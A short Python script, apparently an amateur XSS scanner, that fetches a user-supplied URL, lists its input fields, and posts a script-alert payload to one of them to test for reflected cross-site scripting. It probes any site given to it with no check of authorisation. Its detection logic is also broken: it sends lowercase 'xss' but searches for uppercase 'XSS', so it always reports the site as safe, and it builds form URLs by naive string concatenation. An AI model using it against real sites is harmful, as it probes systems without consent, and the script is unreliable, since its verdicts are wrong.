
import requests
from bs4 import BeautifulSoup
import time

session = requests.Session()
url = input('Witch url to scan? (example: https://example.com/):')
response = requests.get(url)
web_status = response.status_code
if web_status == 200:
    print("Website is up!, now searching for input fields...")
elif web_status == 400:
    print("you maybe misspealed something or theres a different error.")
elif web_status == 403:
    print("403 forbidden")
elif web_status == 404:
    print("check for misspelling or if the host is down.")

suppe = BeautifulSoup(response.text, 'html.parser')
input_felder = suppe.find_all('input')
time.sleep(3)
print(input_felder)
inputfeld = input('Choose a input field:')

form = suppe.find('form')
action_url = form.get('action', url)  
payload = {inputfeld: "<script>alert('xss')</script>"}
form_response = session.post(url + action_url, data=payload)

if "<script>alert('XSS')</script>" in form_response.text:
    print("This input field is vulnerable to XSS!")
else:
    print("This site is not vulnerable to XSS.")